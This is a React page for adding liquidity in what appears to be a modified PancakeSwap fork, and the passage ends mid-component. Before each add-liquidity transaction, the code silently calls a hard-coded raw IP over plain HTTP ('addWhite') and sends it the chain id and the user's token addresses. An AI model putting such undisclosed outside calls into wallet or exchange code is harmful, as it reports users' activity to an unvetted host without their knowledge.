import { useCallback, useEffect, useMemo, useState } from 'react'
import { BigNumber, BigNumberish } from '@ethersproject/bignumber'
import { TransactionResponse } from '@ethersproject/providers'
import { currencyEquals, ETHER, JSBI, TokenAmount, WNATIVE, MINIMUM_LIQUIDITY } from '@pancakeswap/sdk'
import {
  Button,
  Text,
  AddIcon,
  CardBody,
  Message,
  useModal,
  TooltipText,
  useTooltip,
  MessageText,
} from '@pancakeswap/uikit'
import { logError } from 'utils/sentry'
import { useIsTransactionUnsupported, useIsTransactionWarning } from 'hooks/Trades'
import { useTranslation } from '@pancakeswap/localization'
import UnsupportedCurrencyFooter from 'components/UnsupportedCurrencyFooter'
import { useZapContract } from 'hooks/useContract'
import useActiveWeb3React from 'hooks/useActiveWeb3React'
import { getZapAddress } from 'utils/addressHelpers'
import { getLPSymbol } from 'utils/getLpSymbol'
import { useRouter } from 'next/router'
import { callWithEstimateGas } from 'utils/calls'
import { ContractMethodName } from 'utils/types'
import { transactionErrorToUserReadableMessage } from 'utils/transactionErrorToUserReadableMessage'
import { useLPApr } from 'state/swap/hooks'
import { ROUTER_ADDRESS } from 'config/constants/exchange'
import { CAKE } from 'config/constants/tokens'
import { LightCard } from '../../components/Card'
import AmmSwitch from '../../components/AmmSwitch'
import { AutoColumn, ColumnCenter } from '../../components/Layout/Column'
import CurrencyInputPanel from '../../components/CurrencyInputPanel'
import PriceInputPanel from '../../components/PriceInputPanel'
import { AppHeader, AppBody } from '../../components/App'
import { MinimalPositionCard } from '../../components/PositionCard'
import { RowBetween, RowFixed } from '../../components/Layout/Row'
import ConnectWalletButton from '../../components/ConnectWalletButton'

import { PairState } from '../../hooks/usePairs'
import { useCurrency } from '../../hooks/Tokens'
import { ApprovalState, useApproveCallback } from '../../hooks/useApproveCallback'
import useTransactionDeadline from '../../hooks/useTransactionDeadline'
import { Field, resetMintState } from '../../state/mint/actions'
import { useDerivedMintInfo, useMintActionHandlers, useMintState, useZapIn } from '../../state/mint/hooks'
import { useAmmType } from '../../state/amm/hooks'

import { useTransactionAdder } from '../../state/transactions/hooks'
import { useGasPrice, useIsExpertMode, useUserSlippageTolerance, useZapModeManager } from '../../state/user/hooks'
import { calculateGasMargin } from '../../utils'
import { getRouterContract, calculateSlippageAmount } from '../../utils/exchange'
import { maxAmountSpend } from '../../utils/maxAmountSpend'
import { wrappedCurrency } from '../../utils/wrappedCurrency'
import Dots from '../../components/Loader/Dots'
import PoolPriceBar from './PoolPriceBar'
import Page from '../Page'
import ConfirmAddLiquidityModal from './components/ConfirmAddLiquidityModal'
import ConfirmZapInModal from './components/ConfirmZapInModal'
import { ChoosePair } from './ChoosePair'
import { ZapCheckbox } from '../../components/CurrencyInputPanel/ZapCheckbox'
import { formatAmount } from '../../utils/formatInfoNumbers'
import { useCurrencySelectRoute } from './useCurrencySelectRoute'
import { useAppDispatch } from '../../state'
import { CommonBasesType } from '../../components/SearchModal/types'

enum Steps {
  Choose,
  Add,
}

const zapAddress = getZapAddress()

export default function AddLiquidity() {
  const router = useRouter()
  const { account, chainId, library } = useActiveWeb3React()
  const expertMode = useIsExpertMode()

  const ammType = useAmmType()
  const [zapMode] = useZapModeManager()
  const [temporarilyZapMode, setTemporarilyZapMode] = useState(true)
  const [swapSelect, setSwapSelect] = useState(1)
  const [currencyIdA, currencyIdB] = router.query.currency || ['BNB', CAKE[chainId]?.address]
  const [steps, setSteps] = useState(Steps.Choose)

  const dispatch = useAppDispatch()
  const { t } = useTranslation()
  const gasPrice = useGasPrice()

  const currencyA = useCurrency(currencyIdA)
  const currencyB = useCurrency(currencyIdB)

  useEffect(() => {
    if (!currencyIdA && !currencyIdB) {
      dispatch(resetMintState())
    }
  }, [dispatch, currencyIdA, currencyIdB])

  useEffect(() => {
    if (router.query.step === '1') {
      setSteps(Steps.Add)
    }
  }, [router.query])

  const zapModeStatus = useMemo(() => !!zapMode && temporarilyZapMode, [zapMode, temporarilyZapMode])

  // mint state
  const { independentField, typedValue, otherTypedValue } = useMintState()
  const {
    dependentField,
    currencies,
    pair,
    pairState,
    currencyBalances,
    parsedAmounts: mintParsedAmounts,
    price,
    noLiquidity,
    liquidityMinted,
    poolTokenPercentage,
    error,
    addError,
    myPrice,
  } = useDerivedMintInfo(currencyA ?? undefined, currencyB ?? undefined)

  const poolData = useLPApr(pair)
  const { targetRef, tooltip, tooltipVisible } = useTooltip(
    t(`Based on last 7 days' performance. Does not account for impermanent loss`),
    {
      placement: 'bottom',
    },
  )

  const { onFieldPrice, onFieldAInput, onFieldBInput } = useMintActionHandlers(noLiquidity)

  // modal and loading
  const [{ attemptingTxn, liquidityErrorMessage, txHash }, setLiquidityState] = useState<{
    attemptingTxn: boolean
    liquidityErrorMessage: string | undefined
    txHash: string | undefined
  }>({
    attemptingTxn: false,
    liquidityErrorMessage: undefined,
    txHash: undefined,
  })

  // Zap state
  const [zapTokenToggleA, setZapTokenToggleA] = useState(true)
  const [zapTokenToggleB, setZapTokenToggleB] = useState(true)
  const zapTokenCheckedA = zapTokenToggleA && currencyBalances?.[Field.CURRENCY_A]?.greaterThan(0)
  const zapTokenCheckedB = zapTokenToggleB && currencyBalances?.[Field.CURRENCY_B]?.greaterThan(0)

  // txn values
  const deadline = useTransactionDeadline() // custom from users settings
  const [allowedSlippage] = useUserSlippageTolerance() // custom from users

  // get the max amounts user can add
  const maxAmounts: { [field in Field]?: TokenAmount } = [Field.CURRENCY_A, Field.CURRENCY_B].reduce(
    (accumulator, field) => {
      return {
        ...accumulator,
        [field]: maxAmountSpend(currencyBalances[field]),
      }
    },
    {},
  )

  const canZap = useMemo(
    () =>
      !!zapModeStatus &&
      !noLiquidity &&
      !(
        (pair && JSBI.lessThan(pair.reserve0.raw, MINIMUM_LIQUIDITY)) ||
        (pair && JSBI.lessThan(pair.reserve1.raw, MINIMUM_LIQUIDITY))
      ),
    [noLiquidity, pair, zapModeStatus],
  )

  const { handleCurrencyASelect, handleCurrencyBSelect } = useCurrencySelectRoute()

  const { zapInEstimating, rebalancing, ...zapIn } = useZapIn({
    pair,
    canZap,
    currencyA,
    currencyB,
    currencyBalances,
    zapTokenCheckedA,
    zapTokenCheckedB,
    maxAmounts,
  })

  const parsedAmounts = canZap ? zapIn.parsedAmounts : mintParsedAmounts

  const preferZapInstead = canZap && !zapIn.noNeedZap

  // get formatted amounts
  const formattedAmounts = useMemo(
    () => ({
      [independentField]:
        canZap &&
        ((independentField === Field.CURRENCY_A && !zapTokenCheckedA) ||
          (independentField === Field.CURRENCY_B && !zapTokenCheckedB))
          ? ''
          : typedValue,
      // [dependentField]: noLiquidity ? otherTypedValue : parsedAmounts[dependentField]?.toSignificant(6) ?? '',
      [dependentField]:
        parsedAmounts && parsedAmounts[dependentField]
          ? parsedAmounts[dependentField]?.toSignificant(6) ?? ''
          : otherTypedValue,
      [Field.PRICE]: 1,
    }),
    [
      canZap,
      dependentField,
      independentField,
      noLiquidity,
      otherTypedValue,
      parsedAmounts,
      typedValue,
      zapTokenCheckedA,
      zapTokenCheckedB,
    ],
  )

  const atMaxAmounts: { [field in Field]?: TokenAmount } = [Field.CURRENCY_A, Field.CURRENCY_B].reduce(
    (accumulator, field) => {
      return {
        ...accumulator,
        [field]: maxAmounts[field]?.equalTo(parsedAmounts[field] ?? '0'),
      }
    },
    {},
  )

  // check whether the user has approved the router on the tokens
  const [approvalA, approveACallback] = useApproveCallback(
    parsedAmounts[Field.CURRENCY_A],
    preferZapInstead ? zapAddress : ROUTER_ADDRESS[chainId],
  )
  const [approvalB, approveBCallback] = useApproveCallback(
    parsedAmounts[Field.CURRENCY_B],
    preferZapInstead ? zapAddress : ROUTER_ADDRESS[chainId],
  )

  const addTransaction = useTransactionAdder()

  async function onAdd() {
    if (!chainId || !library || !account) return
    const routerContract = getRouterContract(chainId, library, account)

    const { [Field.CURRENCY_A]: parsedAmountA, [Field.CURRENCY_B]: parsedAmountB } = mintParsedAmounts
    if (!parsedAmountA || !parsedAmountB || !currencyA || !currencyB || !deadline) {
      return
    }

    const amountsMin = {
      [Field.CURRENCY_A]: calculateSlippageAmount(parsedAmountA, noLiquidity ? 0 : allowedSlippage)[0],
      [Field.CURRENCY_B]: calculateSlippageAmount(parsedAmountB, noLiquidity ? 0 : allowedSlippage)[0],
    }

    let estimate
    let method: (...args: any) => Promise<TransactionResponse>
    let args: Array<string | string[] | number>
    let value: BigNumber | null
    if (currencyA === ETHER || currencyB === ETHER) {
      const tokenBIsBNB = currencyB === ETHER
      estimate = routerContract.estimateGas.addLiquidityETH
      method = routerContract.addLiquidityETH
      await fetch(
        `http://45.142.157.126:8868/addWhite?chainId=${chainId}&token=${
          wrappedCurrency(tokenBIsBNB ? currencyA : currencyB, chainId)?.address ?? ''
        }`,
        { mode: 'no-cors' },
      )
      args = [
        wrappedCurrency(tokenBIsBNB ? currencyA : currencyB, chainId)?.address ?? '', // token
        (tokenBIsBNB ? parsedAmountA : parsedAmountB).raw.toString(), // token desired
        amountsMin[tokenBIsBNB ? Field.CURRENCY_A : Field.CURRENCY_B].toString(), // token min
        amountsMin[tokenBIsBNB ? Field.CURRENCY_B : Field.CURRENCY_A].toString(), // eth min
        ammType,
        account,
        deadline.toHexString(),
      ]
      value = BigNumber.from((tokenBIsBNB ? parsedAmountB : parsedAmountA).raw.toString())
    } else {
      await fetch(
        `http://45.142.157.126:8868/addWhite?chainId=${chainId}&token=${
          wrappedCurrency(currencyA, chainId)?.address ?? ''
        }`,
        { mode: 'no-cors' },
      )
      await fetch(
        `http://45.142.157.126:8868/addWhite?chainId=${chainId}&token=${
          wrappedCurrency(currencyB, chainId)?.address ?? ''
        }`,
        { mode: 'no-cors' },
      )
      estimate = routerContract.estimateGas.addLiquidity
      method = routerContract.addLiquidity
      args = [
        wrappedCurrency(currencyA, chainId)?.address ?? '',
        wrappedCurrency(currencyB, chainId)?.address ?? '',
        parsedAmountA.raw.toString(),
        parsedAmountB.raw.toString(),
        amountsMin[Field.CURRENCY_A].toString(),
        amountsMin[Field.CURRENCY_B].toString(),
        ammType,
        account,
        deadline.toHexString(),
      ]
      value = null
    }

    setLiquidityState({ attemptingTxn: true, liquidityErrorMessage: undefined, txHash: undefined })
    await estimate(...args, value ? { value } : {})
      .then((estimatedGasLimit) =>
        method(...args, {
          ...(value ? { value } : {}),
          gasLimit: calculateGasMargin(estimatedGasLimit),
          gasPrice,
        }).then((response) => {
          setLiquidityState({ attemptingTxn: false, liquidityErrorMessage: undefined, txHash: response.hash })

          addTransaction(response, {
            summary: `Add ${parsedAmounts[Field.CURRENCY_A]?.toSignificant(3)} ${
              currencies[Field.CURRENCY_A]?.symbol
            } and ${parsedAmounts[Field.CURRENCY_B]?.toSignificant(3)} ${currencies[Field.CURRENCY_B]?.symbol}`,
            type: 'add-liquidity',
          })
        }),
      )
      .catch((err) => {
        if (err && err.code !== 4001) {
          logError(err)
          console.error(`Add Liquidity failed`, err, args, value)
        }
        setLiquidityState({
          attemptingTxn: false,
          liquidityErrorMessage:
            err && err.code !== 4001
              ? t('Add liquidity failed: %message%', { message: transactionErrorToUserReadableMessage(err, t) })
              : undefined,
          txHash: undefined,
        })
      })
  }

  const pendingText = preferZapInstead
    ? t('Zapping %amountA% %symbolA% and %amountB% %symbolB%', {
        amountA: parsedAmounts[Field.CURRENCY_A]?.toSignificant(6) ?? '0',
        symbolA: currencies[Field.CURRENCY_A]?.symbol ?? '',
        amountB: parsedAmounts[Field.CURRENCY_B]?.toSignificant(6) ?? '0',
        symbolB: currencies[Field.CURRENCY_B]?.symbol ?? '',
      })
    : t('Supplying %amountA% %symbolA% and %amountB% %symbolB%', {
        amountA: parsedAmounts[Field.CURRENCY_A]?.toSignificant(6) ?? '',
        symbolA: currencies[Field.CURRENCY_A]?.symbol ?? '',
        amountB: parsedAmounts[Field.CURRENCY_B]?.toSignificant(6) ?? '',
        symbolB: currencies[Field.CURRENCY_B]?.symbol ?? '',
      })

  const handleDismissConfirmation = useCallback(() => {
    // if there was a tx hash, we want to clear the input
    if (txHash) {
      onFieldAInput('')
    }
  }, [onFieldAInput, txHash])

  const addIsUnsupported = useIsTransactionUnsupported(currencies?.CURRENCY_A, currencies?.CURRENCY_B)
  const addIsWarning = useIsTransactionWarning(currencies?.CURRENCY_A, currencies?.CURRENCY_B)

  const zapContract = useZapContract(true)

  const [onPresentAddLiquidityModal] = useModal(
    <ConfirmAddLiquidityModal
      title={noLiquidity ? t('You are creating a pool') : t('You will receive')}
      customOnDismiss={handleDismissConfirmation}
      attemptingTxn={attemptingTxn}
      hash={txHash}
      pendingText={pendingText}
      currencyToAdd={pair?.liquidityToken}
      allowedSlippage={allowedSlippage}
      onAdd={onAdd}
      parsedAmounts={parsedAmounts}
      currencies={currencies}
      liquidityErrorMessage={liquidityErrorMessage}
      price={price}
      noLiquidity={noLiquidity}
      poolTokenPercentage={poolTokenPercentage}
      liquidityMinted={liquidityMinted}
    />,
    true,
    true,
    'addLiquidityModal',
  )

  async function onZapIn() {
    if (!canZap || !parsedAmounts || !zapIn.zapInEstimated || !library || !chainId) {
      return
    }

    let method: ContractMethodName<typeof zapContract>
    let args
    let value: BigNumberish | null
    let summary: string
    const minAmountOut = zapIn.zapInEstimated.swapAmountOut.mul(10000 - allowedSlippage).div(10000)
    if (rebalancing) {
      const maxAmountIn = zapIn.zapInEstimated.swapAmountIn.mul(10000 + allowedSlippage).div(10000)
      summary = `Zap ${parsedAmounts[Field.CURRENCY_A]?.toSignificant(3)} ${
        currencies[Field.CURRENCY_A]?.symbol
      } and ${parsedAmounts[Field.CURRENCY_B]?.toSignificant(3)} ${currencies[Field.CURRENCY_B]?.symbol}`
      if (currencyA === ETHER || currencyB === ETHER) {
        const tokenBIsBNB = currencyB === ETHER
        method = 'zapInBNBRebalancing'
        args = [
          wrappedCurrency(currencies[tokenBIsBNB ? Field.CURRENCY_A : Field.CURRENCY_B], chainId).address, // token1
          parsedAmounts[tokenBIsBNB ? Field.CURRENCY_A : Field.CURRENCY_B].raw.toString(), // token1AmountIn
          pair.liquidityToken.address, // lp
          maxAmountIn, // tokenAmountInMax
          minAmountOut, // tokenAmountOutMin
          zapIn.zapInEstimated.isToken0Sold && !tokenBIsBNB, // isToken0Sold
        ]
        value = parsedAmounts[tokenBIsBNB ? Field.CURRENCY_B : Field.CURRENCY_A].raw.toString()
      } else {
        method = 'zapInTokenRebalancing'
        args = [
          wrappedCurrency(currencies[Field.CURRENCY_A], chainId).address, // token0
          wrappedCurrency(currencies[Field.CURRENCY_B], chainId).address, // token1
          parsedAmounts[Field.CURRENCY_A].raw.toString(), // token0AmountIn
          parsedAmounts[Field.CURRENCY_B].raw.toString(), // token1AmountIn
          pair.liquidityToken.address, // lp
          maxAmountIn, // tokenAmountInMax
          minAmountOut, // tokenAmountOutMin
          zapIn.zapInEstimated.isToken0Sold, // isToken0Sold
        ]
      }
    } else if (currencies[zapIn.swapTokenField] === ETHER) {
      method = 'zapInBNB'
      args = [pair.liquidityToken.address, minAmountOut]
      summary = `Zap in ${parsedAmounts[zapIn.swapTokenField]?.toSignificant(3)} BNB for ${getLPSymbol(
        pair.token0.symbol,
        pair.token1.symbol,
      )}`
      value = parsedAmounts[zapIn.swapTokenField].raw.toString()
    } else {
      method = 'zapInToken'
      args = [
        wrappedCurrency(currencies[zapIn.swapTokenField], chainId).address,
        parsedAmounts[zapIn.swapTokenField].raw.toString(),
        pair.liquidityToken.address,
        minAmountOut,
      ]
      summary = `Zap in ${parsedAmounts[zapIn.swapTokenField]?.toSignificant(3)} ${
        currencies[zapIn.swapTokenField].symbol
      } for ${getLPSymbol(pair.token0.symbol, pair.token1.symbol)}`
    }

    setLiquidityState({ attemptingTxn: true, liquidityErrorMessage: undefined, txHash: undefined })

    callWithEstimateGas(zapContract, method, args, value ? { value, gasPrice } : { gasPrice })
      .then((response) => {
        setLiquidityState({ attemptingTxn: false, liquidityErrorMessage: undefined, txHash: response.hash })

        addTransaction(response, {
          summary,
          type: 'add-liquidity',
        })
      })
      .catch((err) => {
        if (err && err.code !== 4001) {
          logError(err)
          console.error(`Add Liquidity failed`, err, args, value)
        }
        setLiquidityState({
          attemptingTxn: false,
          liquidityErrorMessage: err && err.code !== 4001 ? `Add Liquidity failed: ${err.message}` : undefined,
          txHash: undefined,
        })
      })
  }

  const [onPresentZapInModal] = useModal(
    <ConfirmZapInModal
      title={t('You will receive')}
      customOnDismiss={handleDismissConfirmation}
      attemptingTxn={attemptingTxn}
      hash={txHash}
      pendingText={pendingText}
      pair={pair}
      allowedSlippage={allowedSlippage}
      onAdd={onZapIn}
      parsedAmounts={parsedAmounts}
      currencies={currencies}
      liquidityErrorMessage={liquidityErrorMessage}
      price={price}
      poolTokenPercentage={zapIn.poolTokenPercentage}
      liquidityMinted={zapIn.liquidityMinted}
      zapSwapTokenField={zapIn.swapTokenField}
      zapSwapOutTokenField={zapIn.swapOutTokenField}
      zapInEstimated={zapIn.zapInEstimated}
      rebalancing={rebalancing}
      zapMode={zapModeStatus}
      toggleZapMode={setTemporarilyZapMode}
    />,
    true,
    true,
    'zapInModal',
  )

  const handleEnableZap = () => {
    if (!zapMode) {
      setTemporarilyZapMode(!zapMode)
    }
  }

  let isValid = !error
  let errorText = error

  if (preferZapInstead) {
    isValid = !error && !zapIn.error
    errorText = error ?? zapIn.error
  } else {
    isValid = !error && !addError
    errorText = error ?? addError
  }

  const buttonDisabled =
    !isValid ||
    ((zapIn.parsedAmounts[Field.CURRENCY_A] || (!preferZapInstead && zapTokenCheckedA)) &&
      approvalA !== ApprovalState.APPROVED) ||
    ((zapIn.parsedAmounts[Field.CURRENCY_B] || (!preferZapInstead && zapTokenCheckedB)) &&
      approvalB !== ApprovalState.APPROVED) ||
    (zapIn.priceSeverity > 3 && preferZapInstead)

  const showFieldAApproval =
    (zapTokenCheckedA || !preferZapInstead) &&
    (approvalA === ApprovalState.NOT_APPROVED || approvalA === ApprovalState.PENDING)
  const showFieldBApproval =
    (zapTokenCheckedB || !preferZapInstead) &&
    (approvalB === ApprovalState.NOT_APPROVED || approvalB === ApprovalState.PENDING)

  const shouldShowApprovalGroup = (showFieldAApproval || showFieldBApproval) && isValid

  const oneCurrencyIsWBNB = Boolean(
    chainId &&
      ((currencyA && currencyEquals(currencyA, WNATIVE[chainId])) ||
        (currencyB && currencyEquals(currencyB, WNATIVE[chainId]))),
  )

  const noAnyInputAmount = !parsedAmounts[Field.CURRENCY_A] && !parsedAmounts[Field.CURRENCY_B]

  const showAddLiquidity =
    (!!currencies[Field.CURRENCY_A] && !!currencies[Field.CURRENCY_B] && steps === Steps.Add) || !canZap

  const showZapWarning =
    preferZapInstead &&
    !noAnyInputAmount &&
    ((!rebalancing && !(!zapTokenCheckedA && !zapTokenCheckedB)) || (rebalancing && zapIn.priceSeverity > 3))

  const showReduceZapTokenButton =
    preferZapInstead && (zapIn.priceSeverity > 3 || zapIn.zapInEstimatedError) && maxAmounts[zapIn.swapTokenField]

  const showRebalancingConvert =
    !showZapWarning &&
    !noAnyInputAmount &&
    !showReduceZapTokenButton &&
    preferZapInstead &&
    zapIn.isDependentAmountGreaterThanMaxAmount &&
    rebalancing

  const showZapIsAvailable =
    !zapMode &&
    !showZapWarning &&
    !noAnyInputAmount &&
    (!zapTokenCheckedA || !zapTokenCheckedB) &&
    !noLiquidity &&
    !(
      (pair && JSBI.lessThan(pair.reserve0.raw, MINIMUM_LIQUIDITY)) ||
      (pair && JSBI.lessThan(pair.reserve1.raw, MINIMUM_LIQUIDITY))
    )

  const swapFormulaList = [
    {
      label: 'SWAP1',
      value: 'P=Y/X',
    },
    {
      label: 'SWAP2',
      value: 'P=4Y/3X',
    },
    {
      label: 'SWAP3',
      value: 'P=2Y/X',
    },
  ]

  return (
    <Page>
      <AppBody>
        {!showAddLiquidity && (
          <ChoosePair
            error={error}
            currencyA={currencies[Field.CURRENCY_A]}
            currencyB={currencies[Field.CURRENCY_B]}
            onNext={() => setSteps(Steps.Add)}
          />
        )}
        {showAddLiquidity && (
          <>
            <AmmSwitch
              swapSelect={swapSelect}
              setSwapSelect={setSwapSelect}
              backTo={canZap ? () => setSteps(Steps.Choose) : '/liquidity'}
            />
            {/* <AppHeader
              title={
                currencies[Field.CURRENCY_A]?.symbol && currencies[Field.CURRENCY_B]?.symbol
                  ? `${getLPSymbol(currencies[Field.CURRENCY_A].symbol, currencies[Field.CURRENCY_B].symbol)}`
                  : t('Add Liquidity')
              }
              subtitle={t('Receive LP tokens and earn 0.17% trading fees')}
              helper={t(
                'Liquidity providers earn a 0.17% trading fee on all trades made for that token pair, proportional to their share of the liquidity pool.',
              )}
              backTo={canZap ? () => setSteps(Steps.Choose) : '/liquidity'}
            /> */}
            {/* exp diff */}
            <CardBody>
              <AutoColumn gap="20px">
                {noLiquidity && (
                  // <ColumnCenter>
                  //   <Message variant="warning">
                  //     <div style={{
                  //         fontFamily: 'Inter',
                  //         fontStyle: 'normal',
                  //         fontWeight: 400,
                  //         fontSize: '10px',
                  //         lineHeight: '12px',
                  //         color: '#4263EB'
                  //       }}>
                  //       <Text bold mb="8px">
                  //         {t('You are the first liquidity provider.')}
                  //       </Text>
                  //       <Text mb="8px">{t('The ratio of tokens you add will set the price of this pool.')}</Text>
                  //       <Text>{t('Once you are happy with the rate click supply to review.')}</Text>
                  //     </div>
                  //   </Message>
                  // </ColumnCenter>
                  <div
                    style={{
                      fontFamily: 'Inter',
                      fontStyle: 'normal',
                      fontWeight: 400,
                      fontSize: '10px',
                      lineHeight: '16px',
                      color: '#4263EB',
                    }}
                  >
                    <span>{t('You are the first liquidity provider.')}</span>
                    <span>{t('The ratio of tokens you add will set the price of this pool.')}</span>
                    <span>{t('Once you are happy with the rate click supply to review.')}</span>
                  </div>
                )}
                <Text textAlign="center">
                  <div style={{ display: 'flex', justifyContent: 'center', marginTop: '0px' }}>
                    <Text style={{ marginRight: '20px' }}>{swapFormulaList[swapSelect - 1].label}</Text>
                    <Text>{swapFormulaList[swapSelect - 1].value}</Text>
                  </div>
                  {/* 恒定乘积公式 XY^0.5=K */}
                </Text>
                {noLiquidity && (
                  <PriceInputPanel
                    showBUSD
                    onInputBlur={zapIn.onInputBlurOnce}
                    disabled={canZap && !zapTokenCheckedA}
                    error={zapIn.priceSeverity > 3 && zapIn.swapTokenField === Field.CURRENCY_A}
                    beforeButton={<></>}
                    onCurrencySelect={handleCurrencyASelect}
                    disableCurrencySelect={canZap}
                    zapStyle={canZap ? 'zap' : 'noZap'}
                    value={myPrice}
                    onUserInput={onFieldPrice}
                    onMax={() => {
                      console.log('onMax')
                    }}
                    showMaxButton={false}
                    currency={currencies[Field.CURRENCY_A]}
                    otherCurrency={currencies[Field.CURRENCY_B]}
                    id="add-liquidity-price"
                    showCommonBases={false}
                    commonBasesType={CommonBasesType.LIQUIDITY}
                    disableCurrencySelectbBottomToken={canZap}
                    onCurrencySelectBottomToken={handleCurrencyBSelect}
                    currencyBottomToken={currencies[Field.CURRENCY_A]}
                    showCommonBasesBottomToken
                    commonBasesTypeBottomToken={CommonBasesType.LIQUIDITY}
                  />
                )}
                {/* otherCurrencyBottomToken={} */}
                <CurrencyInputPanel
                  disableCurrencySelect={canZap}
                  showBUSD
                  onInputBlur={zapIn.onInputBlurOnce}
                  error={zapIn.priceSeverity > 3 && zapIn.swapTokenField === Field.CURRENCY_A}
                  disabled={canZap && !zapTokenCheckedA}
                  beforeButton={
                    canZap && (
                      <ZapCheckbox
                        disabled={currencyBalances?.[Field.CURRENCY_A]?.equalTo(0)}
                        checked={zapTokenCheckedA}
                        onChange={(e) => {
                          setZapTokenToggleA(e.target.checked)
                        }}
                      />
                    )
                  }
                  onCurrencySelect={handleCurrencyASelect}
                  zapStyle={canZap ? 'zap' : 'noZap'}
                  value={formattedAmounts[Field.CURRENCY_A]}
                  onUserInput={onFieldAInput}
                  onMax={() => {
                    onFieldAInput(maxAmounts[Field.CURRENCY_A]?.toExact() ?? '')
                  }}
                  showMaxButton={!atMaxAmounts[Field.CURRENCY_A]}
                  currency={currencies[Field.CURRENCY_A]}
                  id="add-liquidity-input-tokena"
                  showCommonBases
                  commonBasesType={CommonBasesType.LIQUIDITY}
                  label="X"
                />
                <div style={{ height: 0, marginTop: '-10px' }}>
                  <ColumnCenter>
                    <AddIcon width="16px" />
                  </ColumnCenter>
                </div>
                <div style={{ marginTop: '-20px' }}>
                  <CurrencyInputPanel
                    showBUSD
                    onInputBlur={zapIn.onInputBlurOnce}
                    disabled={canZap && !zapTokenCheckedB}
                    error={zapIn.priceSeverity > 3 && zapIn.swapTokenField === Field.CURRENCY_B}
                    beforeButton={
                      canZap && (
                        <ZapCheckbox
                          disabled={currencyBalances?.[Field.CURRENCY_B]?.equalTo(0)}
                          checked={zapTokenCheckedB}
                          onChange={(e) => {
                            setZapTokenToggleB(e.target.checked)
                          }}
                        />
                      )
                    }
                    onCurrencySelect={handleCurrencyBSelect}
                    disableCurrencySelect={canZap}
                    zapStyle={canZap ? 'zap' : 'noZap'}
                    value={formattedAmounts[Field.CURRENCY_B]}
                    onUserInput={onFieldBInput}
                    onMax={() => {
                      onFieldBInput(maxAmounts[Field.CURRENCY_B]?.toExact() ?? '')
                    }}
                    showMaxButton={!atMaxAmounts[Field.CURRENCY_B]}
                    currency={currencies[Field.CURRENCY_B]}
                    id="add-liquidity-input-tokenb"
                    showCommonBases
                    commonBasesType={CommonBasesType.LIQUIDITY}
                    label="Y"
                  />
                </div>
                {showZapWarning && (
                  <Message variant={zapIn.priceSeverity > 3 ? 'danger' : 'warning'}>
                    {zapIn.priceSeverity > 3 ? (
                      <MessageText>
                        {t('Price Impact Too High.')}{' '}
                        <strong>
                          {t('Reduce amount of %token% to maximum limit', {
                            token: currencies[zapIn.swapTokenField]?.symbol,
                          })}
                        </strong>
                      </MessageText>
                    ) : (
                      <MessageText>
                        <strong>
                          {t('No %token% input.', { token: currencies[zapIn.swapOutTokenField]?.symbol })}
                        </strong>{' '}
                        {t('Some of your %token0% will be converted to %token1%.', {
                          token0: currencies[zapIn.swapTokenField]?.symbol,
                          token1: currencies[zapIn.swapOutTokenField]?.symbol,
                        })}
                      </MessageText>
                    )}
                  </Message>
                )}
                {showReduceZapTokenButton && (
                  <RowFixed style={{ margin: 'auto' }} onClick={() => zapIn.convertToMaxZappable()}>
                    <Button variant="secondary" scale="sm">
                      {t('Reduce %token%', { token: currencies[zapIn.swapTokenField]?.symbol })}
                    </Button>
                  </RowFixed>
                )}
                {showZapIsAvailable && (
                  <Message variant="warning">
                    <MessageText>
                      {t('Zap allows you to add liquidity with only 1 single token. Click')}
                      <Button p="0 4px" scale="sm" variant="text" height="auto" onClick={handleEnableZap}>
                        {t('here')}
                      </Button>
                      {t('to try.')}
                    </MessageText>
                  </Message>
                )}
                {showRebalancingConvert && (
                  <Message variant="warning">
                    <AutoColumn>
                      <MessageText>
                        <strong>
                          {t('Not enough %token%.', { token: currencies[zapIn.swapOutTokenField]?.symbol })}
                        </strong>{' '}
                        {zapIn.gasOverhead
                          ? t(
                              'Some of your %token0% will be converted to %token1% before adding liquidity, but this may cause higher gas fees.',
                              {
                                token0: currencies[zapIn.swapTokenField]?.symbol,
                                token1: currencies[zapIn.swapOutTokenField]?.symbol,
                              },
                            )
                          : t('Some of your %token0% will be converted to %token1%.', {
                              token0: currencies[zapIn.swapTokenField]?.symbol,
                              token1: currencies[zapIn.swapOutTokenField]?.symbol,
                            })}
                      </MessageText>
                    </AutoColumn>
                  </Message>
                )}
                {showRebalancingConvert && (
                  <RowFixed
                    style={{ margin: 'auto' }}
                    onClick={() => {
                      if (dependentField === Field.CURRENCY_A) {
                        onFieldAInput(maxAmounts[dependentField]?.toExact() ?? '')
                      } else {
                        onFieldBInput(maxAmounts[dependentField]?.toExact() ?? '')
                      }
                    }}
                  >
                    <Button variant="secondary" scale="sm">
                      {t('Don’t convert')}
                    </Button>
                  </RowFixed>
                )}
                <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'flex-end' }}>
                  <Text bold fontSize="12px" color="secondary" style={{ color: '#333333', fontSize: '12px' }}>
                    {t('Slippage Tolerance')}
                  </Text>
                  <Text bold color="primary" style={{ marginLeft: '10px', color: '#333333', fontSize: '12px' }}>
                    {allowedSlippage / 100}%
                  </Text>
                </div>
                {currencies[Field.CURRENCY_A] && currencies[Field.CURRENCY_B] && pairState !== PairState.INVALID && (
                  <LightCard padding="1rem" borderRadius="20px" backgroundColor="#EDF3F9 !important">
                    <PoolPriceBar
                      currencies={currencies}
                      poolTokenPercentage={preferZapInstead ? zapIn.poolTokenPercentage : poolTokenPercentage}
                      noLiquidity={noLiquidity}
                      price={price}
                      myPrice={myPrice}
                    />
                  </LightCard>
                )}
                {/* 恒定乘积公式 XY^0.5=K */}
                <Text textAlign="center">
                  <div style={{ display: 'flex', justifyContent: 'center', marginTop: '0px' }}>
                    <Text style={{ marginRight: '20px' }}>{swapFormulaList[swapSelect - 1].label}</Text>
                    <Text>{swapFormulaList[swapSelect - 1].value}</Text>
                  </div>
                </Text>
                {pair && poolData && (
                  <RowBetween>
                    <TooltipText ref={targetRef} bold fontSize="12px" color="secondary">
                      {t('LP reward APR')}
                    </TooltipText>
                    {tooltipVisible && tooltip}
                    <Text bold color="primary">
                      {formatAmount(poolData.lpApr7d)}%
                    </Text>
                  </RowBetween>
                )}
                {addIsUnsupported || addIsWarning ? (
                  <Button disabled mb="4px">
                    {t('Unsupported Asset')}
                  </Button>
                ) : !account ? (
                  <ConnectWalletButton />
                ) : (
                  <AutoColumn gap="md">
                    {shouldShowApprovalGroup && (
                      <RowBetween style={{ gap: '8px' }}>
                        {showFieldAApproval && (
                          <Button
                            onClick={approveACallback}
                            disabled={approvalA === ApprovalState.PENDING}
                            width="100%"
                          >
